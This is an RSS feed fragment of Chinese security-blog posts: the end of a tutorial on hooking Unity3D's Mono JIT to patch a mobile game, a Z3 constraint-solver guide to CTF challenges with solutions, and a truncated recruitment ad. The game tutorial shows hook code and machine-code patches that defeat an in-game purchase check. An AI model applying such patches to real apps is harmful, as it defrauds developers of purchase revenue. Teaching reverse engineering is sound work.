}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里隐去了编译 invoke 函数的代码和一些细枝末节的 check 。可以看到， mono_jit_compile_method_with_opt 函数的主要流程是首先查表看当前要编译的函数是否已经编译，如果已经编译，则直接返回编译好的结果；否则，调用 mono_jit_compile_method_inner 函数实际编译并注册到 target_domain 中，随后通过 mono_create_ftnptr 函数获取函数指针。因为这部分代码是复用的，除了首次加载 DLL 之外的一些情景也会调用该函数，其中存在一些函数已经编译的情况。 mono_jit_compile_method_inner 函数以下是一些与机器相关的具体机器码生成过程，对虚拟机感兴趣的朋友可以进一步学习，这里就不继续深究了，简单把整个调用过程整理一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;graph TD;
start--&amp;gt;mono_precompile_assemblies
mono_precompile_assemblies--&amp;gt;|foreach|mono_precompile_assembly
mono_precompile_assembly--&amp;gt;|函数体|mono_jit_compile_method
mono_precompile_assembly--&amp;gt;|invoke|mono_marshal_get_runtime_invoke
mono_marshal_get_runtime_invoke--&amp;gt;mono_jit_compile_method
mono_jit_compile_method--&amp;gt;mono_jit_compile_method_with_opt
mono_jit_compile_method_with_opt--&amp;gt;|已经编译过|mono_create_ftnptr
mono_jit_compile_method_with_opt--&amp;gt;|没有编译过|mono_jit_compile_method_inner
mono_jit_compile_method_inner--&amp;gt;mini_method_compile
mini_method_compile--&amp;gt;mono_codegen
mono_codegen--&amp;gt;mono_create_ftnptr
mono_create_ftnptr--&amp;gt;finish&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;至此我们的分析完成了，尽管虚拟机可以使用花样繁多的语言开发，但是最终在执行前一需要恢复成本地机器码去执行。这就给了我们下 hook 的机会，下一节介绍通过修改 mono 编译出来的汇编函数逻辑，完成对游戏流程的动态修改。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X03  通过修改虚拟机生成的汇编指令修改游戏逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来我们尝试利用前面两节介绍的知识，修改游戏的执行逻辑.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void MainButtonClicked()
{
	...
		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们选择 MainButtonClicked 这个函数作为目标，其中的购买金币分支会检测当前钻石数量，如果数量够则进行购买，否则不进行购买。在 mono_jit_compile_method_with_opt 函数上下钩子，检查第一个参数 method 的 name 字段是否包含“ MainButtonClicked ”，在包含这个字段时，将 gpointer 指向的函数 dump 出来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;	if(!strstr(name, &quot;MainButtonClicked&quot;)) return target(arg1, arg2, arg3);
	LOGE(&quot;find MainButtonClicked&quot;);
	void* funcptr = target(arg1, arg2, arg3);
	LOGE(&quot;function MainButtonClicked base is: %0lx&quot;, funcptr);
	int fd = open(&quot;/data/local/tmp/dump&quot;, O_WRONLY | O_CREAT);
	if(fd == -1){
		LOGE(&quot;open error: %s&quot;, strerror(errno));
		exit(-1);
	}
	if(write(fd, funcptr, 0x1000 * 0x1000) == -1){
		LOGE(&quot;write error: %s&quot;, strerror(errno));
		exit(-1);
	}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如上述代码所示，这次 hook 在 mono_jit_compile_method_with_opt 函数每次编译 C# 函数点进行判断，当被编译的函数是我们的目标 MainButtonClicked 时，对内存进行 dump ，将编译成机器码的 MainButtonClicked 输出出来，接下来，使用 IDA 对该函数进行分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在加载该函数时需要注意，由于 dump 出来的是部分内存，不像标准的 elf 文件一样有各种配置能够加载，识别为 binary file ，需要手动指定处理器架构，这里是 ARM 。另外需要指定硬盘文件偏移和程序在内存中偏移的映射关系，注意上边代码中第四行输出了程序在内存中的地址，IDA 能够利用 file_offset+memory_base 计算出相当一部分的跳转指令的跳转地址（当然，由于我们只 dump 了很小一部分内存，仍然有很多依赖相对偏移寻址的跳转目标无法恢复，但对程序结构的分析无太大影响）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 IDA 加载后，可以看出函数明显是一个 switch-case 结构：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-18af552a8585f0802182b8d233b5501a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;726&quot; data-rawheight=&quot;485&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个结构与 MainButtonClicked 函数原始形式一致，通过分析二者关系可以定位到金币购买时点击确定按键对应到的 case ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cdc0d4b206e0401f62255f720f602fe9_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;途中的两个分支就是 C# 中的 if-else 。由于高级语言数据结构比较复杂，反应在机器码层面取数据涉及问题较多，因此修改取数据比较困难。但是可以看到，上面的 block 中 R5 是最后取出的当前剩余宝石，当与其进行比较之后，如果宝石充足，则会跳转到红色分支开始购买，增加金币扣除宝石。因此应当修改的逻辑是图中 1 处，通过 nop（mov r0, r0）掉跳转强制执行购买流程。为了在修改金币的同时不减少宝石，将2处宝石运算改为 add r0 , r0 , r5 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;确定了修改点之后将上述两条命令汇编，使用之前的 hook 稍作修改，当执行到 MainButtonClicked 编译时修改程序机器码（ mono 已经很贴心的 mprotect 过了），完成对游戏的修改，接下来尝试购买宝石，哇，奇迹发生了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X04  后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文从一个简单小游戏的破解出发，介绍了 Unity3D 引擎使用 mono 进行 C# JIT 编译的思路，并设计了实验性质的 hook 方案。其实针对这款简单的小游戏，更简单的破解方式还有很多种，牛刀杀鸡是为了以后更容易杀牛。因为在实际的环境中，分析游戏面临着过反调试、脱壳、对抗去符号、DLL 解密等多重挑战。限于篇幅不可能对这些技术一一介绍，感兴趣的朋友可以自行百度/谷歌。另外，由于使用了 AOT 机制，文章中介绍的 hook 思路可能会更适用于 iOS ，条件所限没有尝试。攻击是为了更好的防御，使用的实例，介绍的工具都为了更好的说明技术本身，请不要用违法的目的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考文献&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;[1]: &lt;a href=&quot;http://www.cnblogs.com/murongxiaopifu/p/4211964.html&quot;&gt;Mono为何能跨平台？聊聊CIL(MSIL) - 慕容小匹夫 - 博客园&lt;/a&gt;	&quot;Mono为何能跨平台？聊聊CIL(MSIL)&quot;&lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;http://www.ecma-international.org/&quot;&gt;Welcome to Ecma International&lt;/a&gt;	&quot;EMCA官网&quot;&lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt;	&quot;Android Inline Hook&quot;&lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/mono/mono&quot;&gt;mono/mono&lt;/a&gt;	&quot;Mono Project on Github&quot;&lt;/p&gt;&lt;p&gt;[5]: &lt;a href=&quot;https://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt;	&quot;古河大大libinject&quot;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-07-30703785</guid>
<pubDate>Tue, 07 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Z3一把梭：用约束求解搞定一类CTF题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-29-30548907.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Z3一把梭：用约束求解搞定一类CTF题&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30548907&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ab18970a5c5801d979023ff5ef808f23_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Z3 简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3&quot;&gt;Z3&lt;/a&gt; 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用，本文以近期的 CTF 题为实例，向尚未接触过约束求解器的小伙伴们介绍 Z3 在 CTF 解题中的应用。&lt;/p&gt;&lt;p&gt;Z3 约束求解器是针对 &lt;a href=&quot;https://en.wikipedia.org/wiki/Satisfiability_modulo_theories&quot;&gt;Satisfiability modulo theories Problem&lt;/a&gt; 的一种通用求解器。所谓 SMT 问题，在 Z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 Z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 Z3 想象得过于万能。&lt;/p&gt;&lt;p&gt;Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 &lt;a href=&quot;http://angr.io/&quot;&gt;angr&lt;/a&gt; 也内置了一个修改版的 Z3。&lt;/p&gt;&lt;p&gt;Z3 本身提供一个类似于 Lisp 的内置语言，但是实际使用中，一般使用 Python Binding 操作会比较方便。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/namespacez3py.html&quot;&gt;http://z3prover.github.io/api/html/namespacez3py.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://pypi.python.org/pypi/z3-solver/4.5.1.0&quot;&gt;https://pypi.python.org/pypi/z3-solver/4.5.1.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&quot;&gt;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Z3 入门&lt;/h2&gt;&lt;p&gt;Z3 内置了多种变量类型，基本能覆盖常见计算机数据结构。包括整数、浮点数、BitVector、数组等。&lt;/p&gt;&lt;p&gt;先来一个简单的例子看一下 Z3 能做什么：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;from z3 import *

x = Int(&#39;x&#39;)
y = Int(&#39;y&#39;)
solve(x &amp;gt; 2, y &amp;lt; 10, x + 2*y == 7) &lt;/code&gt;&lt;p&gt;上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。&lt;/p&gt;&lt;p&gt;然后就调用了 &lt;code class=&quot;inline&quot;&gt;solve&lt;/code&gt; 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。&lt;/p&gt;&lt;p&gt;运行一下结果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ python example.py 
[y = 0, x = 7] &lt;/code&gt;&lt;p&gt;可以看出，Z3 找到了 y=0，x=7 这组解。细心的小伙伴会发现，x=5,y=1 也符合条件，为什么没有体现？原因在于 Z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。&lt;/p&gt;&lt;p&gt;好了，经过上面的简单介绍相信大家都对 Z3 有一个基本的认识，下面看看在 CTF 实际应用。&lt;/p&gt;&lt;h2&gt;Z3 实战样题一：DEFCAMP 2017 Misc 题 forgot my key&lt;/h2&gt;&lt;p&gt;题目如下：&lt;/p&gt;&lt;p&gt;I forgot my flag &amp;amp; key. Help me recover them.&lt;/p&gt;&lt;p&gt;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function my_encrypt($flag, $key) {
  $key = md5($key);
  $message = $flag . &quot;|&quot; . $key;

  $encrypted = chr(rand(0, 126));
  for($i=0;$i&amp;lt;strlen($message);$i++) {
    $encrypted .= chr((ord($message[$i]) + ord($key[$i % strlen($key)]) + ord($encrypted[$i])) % 126);
  }
  $hexstr = unpack(&#39;h*&#39;, $encrypted);
  return array_shift($hexstr);
}
&lt;/code&gt;&lt;p&gt;这题给了一个加密函数，要求还原 flag 和 key。观察可以发现，加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。&lt;/li&gt;&lt;li&gt;第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;思路是有了，然而写起来未必简单，因为人的思维都是正向的，逆向求解特别是还要写出完整求解代码总是麻烦的。&lt;/p&gt;&lt;p&gt;于是我们考虑是否可以使用 Z3 来求解。首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑。其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来。如此分析应该 Z3 一把梭问题不大。&lt;/p&gt;&lt;p&gt;代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python3

from z3 import *
import binascii

s = &#39;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#39;

encrypted = []
for i in range(0, len(s), 2):
    encrypted.append(binascii.unhexlify(s[i+1] + s[i])[0])

print(&#39;message len:&#39;, len(encrypted)-1)
print(encrypted)
# 声明变量，encrypted 是已知，因此 IntVal 即可
encrypted = [IntVal(i) for i in encrypted]
message = [Int(&#39;flag%d&#39; % i) for i in range(len(encrypted)-1)]
# 创建一个求解器，求解全靠它
solver = Solver()

ml = len(encrypted) - 1

# 添加明文字符的约束条件
for i in range(ml):
    if i == ml - 33:
        solver.add(message[i] == ord(&#39;|&#39;))
    else:
        # 肯定是可见字符，因此限定范围如下
        solver.add(message[i] &amp;lt; 127)
        solver.add(message[i] &amp;gt;= 32)
# 添加明文和密文对照关系的约束条件
for i in range(ml):
    solver.add(encrypted[i+1] == (message[i] + message[ml-32+i%32] + encrypted[i]) % 126)

if solver.check() == sat:
    m = solver.model()
    s = []
    for i in range(ml):
        s.append(m[message[i]].as_long())
    print(bytes(s))
else:
    print(&#39;unsat&#39;) &lt;/code&gt;&lt;p&gt;运行求解：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python solve.py 
message len: 103
b&#39;DCTF{0d940de38493d96dc6255cbb2c2ac7a2db1a7792c74859e95215caa6b57c69b2}|6941f4cac9b7784fdd77e11b51cd0d64&#39;

real	0m7.277s
user	0m7.260s
sys	0m0.010s &lt;/code&gt;&lt;p&gt;在我的 Mac 上总共耗时 7s。从这个 &lt;a href=&quot;http://solve.py/&quot;&gt;solve.py&lt;/a&gt; 可以看出，由于使用了 Z3，求解整个题目所需要做的事情基本就是照着原来的逻辑照抄翻译一遍，再添加其他细节（如可见字符范围在32到127之间），然后求解，就大功告成了！&lt;/p&gt;&lt;h2&gt;z3 实战样题二：CSAW 2017 逆向题 realism&lt;/h2&gt;&lt;p&gt;前面是一道简单的 misc/crypto 题目，这里再展示 Z3 在一道逆向题的应用。 realism 是一个主要针对 x86 &lt;a href=&quot;https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions&quot;&gt;SSE 指令&lt;/a&gt; 的逆向题目。题目可以从 &lt;a href=&quot;https://github.com/youben11/CSAW_2017_quals_rev400&quot;&gt;https://github.com/youben11/CSAW_2017_quals_rev400&lt;/a&gt; 获取。&lt;/p&gt;&lt;p&gt;题目的主要逻辑其实并不长，但是由于应用了 SSE 指令，且同样是一番循环逻辑运算之后，要求运算结果与某个预设值相等，逆向起来有一定复杂度。关键逻辑如下图：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b294784dcae9d6b0bcee51759487f3c_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2032&quot; data-rawheight=&quot;927&quot;&gt;&lt;p&gt;把逻辑整理成伪代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;xmm5 = results[0]

for i in range(8, 0, -1):
    xmm2 = andps(flag, bytes(masks[i:i+8]))
    xmm5 = psadbw(xmm5, xmm2)
    assert xmm5 == results[9-i] &lt;/code&gt;&lt;p&gt;同样的，如果要根据结果逆推，首先需要理解清楚每一个指令的精确含义，然后需要做大量的逆推工作。因此考虑是否可以用 Z3 从正向思维来解决这类问题。&lt;/p&gt;&lt;p&gt;这里的难点在于要准确模拟 andps 和 psadbw 两个指令的行为。此外，需要选择正确的 BitVector 大小。因为 8 位会导致 psadbw 加法溢出得到错误的值，因此这里统一使用 16 位。&lt;/p&gt;&lt;p&gt;程序如下： &lt;a href=&quot;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&quot;&gt;https://gist.github.com/zTrix/036d904e85946fa273067f184210a6de&lt;/a&gt;&lt;/p&gt;&lt;p&gt;运行我们的程序：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ time python3 solve.py 
b&#39;flag{4r3alz_m0d3_y0}&#39;

real	0m0.788s
user	0m0.790s
sys	0m0.000s &lt;/code&gt;&lt;p&gt;仅需 0.8s 即可解出结果。&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;合理使用 Z3 可以在许多场景下根据约束自动帮助我们求解，只需要根据正向思路使用 Z3 表达原有逻辑即可，大大减少我们分析和逆推的时间。当然，Z3 的功能远不止这些，这里只是介绍了最简单的入门应用，有兴趣的小伙伴可以通过阅读文档资料进一步了解。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3&quot;&gt;https://rise4fun.com/z3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3/wiki/Slides&quot;&gt;https://github.com/Z3Prover/z3/wiki/Slides&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/index.html&quot;&gt;http://z3prover.github.io/api/html/index.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&quot;&gt;http://research.microsoft.com/en-us/um/redmond/projects/z3/z3.pdf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://rise4fun.com/z3/tutorialcontent/guide&quot;&gt;Z3 - Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(长亭技术专栏原创文章，转载请注明来源)&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-29-30548907</guid>
<pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-27-30515472.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30515472&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-550fa0c48fdc0b4ab5d1281c4cc098fd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;我大学的时候学了一份&lt;b&gt;特别牛逼、高大上&lt;/b&gt;的专业——生物科学。&lt;br&gt;至于为啥我学了这个专业，不知道是哪个神人在我报志愿之前，天天吹捧&lt;b&gt;21世纪是生物学的天下&lt;/b&gt;！&lt;br&gt;当时研究了三个专业：生物工程、生物技术、生物科学，&lt;b&gt;只有这个生物科学听起来是最为牛逼&lt;/b&gt;的。&lt;br&gt;现在看起来依然牛逼，毕业之后工作也确实难找。&lt;br&gt;其实除了班里一半深造的，其他的人只有一个从事了生物行业。&lt;br&gt;最为蛋疼的是，好几个准备考公务员却止步于专业限制，我们这个专业考公务员都受限！&lt;br&gt;那位说21世纪是生物学的神人同志，现在我要来跟你聊一下人生聊一下理想。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;我是正在找工作的应届师范生。&lt;br&gt;当初选了服从调剂专业，教育技术，开始一年都不知道干嘛的，大概就是中学信息技术老师。&lt;br&gt;当时觉得当个副科老师不错啊！&lt;br&gt;真正找工作了才发现，市场需求太少！！&lt;br&gt;&lt;b&gt;没几个学校缺信息技术老师的！！！&lt;/b&gt;&lt;br&gt;语文数学的一招就是几十个，信息技术一两个或者压根不要，不当老师又不知道还能干嘛？&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;本科生物，学霸，&lt;b&gt;成绩top 1％&lt;/b&gt;，&lt;br&gt;然后，大四没有找到工作……&lt;br&gt;怒而考研，&lt;b&gt;跨专业，挑战CS&lt;/b&gt;（计算机）&lt;br&gt;真是比高三还辛苦，高三时无知者无畏，没什么压力。&lt;br&gt;虽然之前一直努力，但稳稳妥妥生物与CS，风马牛不相及啊。&lt;br&gt;&lt;b&gt;考研努力流过的汗都是当年选专业时脑子进的水啊~&lt;/b&gt;&lt;br&gt;都说转行毁三年，诚然，我三年的生物学积累毁于一旦。&lt;br&gt;然，不转，毁我一生！&lt;br&gt;不过，“21世纪是生物的世纪”，现在毕竟只是世纪之初，以后的事谁又能预料。&lt;br&gt;不过，不会后悔。我爱CS，JUST DO IT!&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这些案例，是不是看着有些眼熟？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;说的就是你对不对？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;（备注：以上并不是吐槽任何专业不好，而是部分专业确实存在就业难的问题，请勿吐槽）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;影影绰绰中，我们提出一个大胆的想法！&lt;/p&gt;&lt;p&gt;&lt;b&gt;不！限！专！业！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;醉心CS，爱钻研，懂技术，享受成就的你们！&lt;/p&gt;&lt;p&gt;&lt;b&gt;有胆量，来长亭试试吧！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是怂恿放弃其他专业，而是当你心中有这个声音时，多给你一个选择！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CROSS计划&lt;/b&gt;，是长亭科技为发掘在计算机领域中拥有独到见解与研究的&lt;b&gt;非计算机专业人才&lt;/b&gt;而决定每年保留的校招计划！接头口号： &lt;b&gt;好胆你就来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;不管你学什么专业，建筑、土木、数学甚至是与计算机毫不相关的文科生，只要你对计算机领域拥有浓厚的兴趣，且在业余时间：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;花了足够的精力去钻研，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有扎实的数理基础，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有独立的思考和研究态度&lt;/b&gt;，&lt;/p&gt;&lt;p&gt;&lt;b&gt;我们统统欢迎！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其实，我们也&lt;b&gt;怕&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;这个活动没有那么多人响应，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;你们害怕自己技术不行，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;有人觉得长亭这个提议太理想国了！&lt;/p&gt;&lt;p&gt;While，我们选择站了出来，毕竟，&lt;/p&gt;&lt;p&gt;&lt;b&gt;放胆迈出第一步，才有可能将理想变成现实！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，邀请您，你，恁，&lt;b&gt;好胆你就来&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是计算机专业≠不是计算机人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当你心中有这个声音时，多给你一个选择。&lt;/p&gt;&lt;p&gt;大胆地迈出这一步，做自己真正想做的事情。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以跟随技术大牛光速起步，迅速打下扎实的计算机功底。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以参与各种规范的工程项目，快速积累丰富的工程经验。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你还可以接触最新最酷的黑客技术，见证各种魔术般颠覆想象的神奇。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;而以上通通不是吹牛，因为我们有足够多的转行成功案例，他们来自于不同的专业：数学、水利、航空航天、航海、机械等等等等，哦差点忘了，还。。。还有秘书专业。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应届毕业生通过CROSS计划：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1. 进入长亭科技产品研发部门实习&lt;/p&gt;&lt;p&gt;2. 获得长亭技术大佬&lt;b&gt;1对1指导&lt;/b&gt;的珍贵机会（CTO亲自参与）&lt;/p&gt;&lt;p&gt;3. 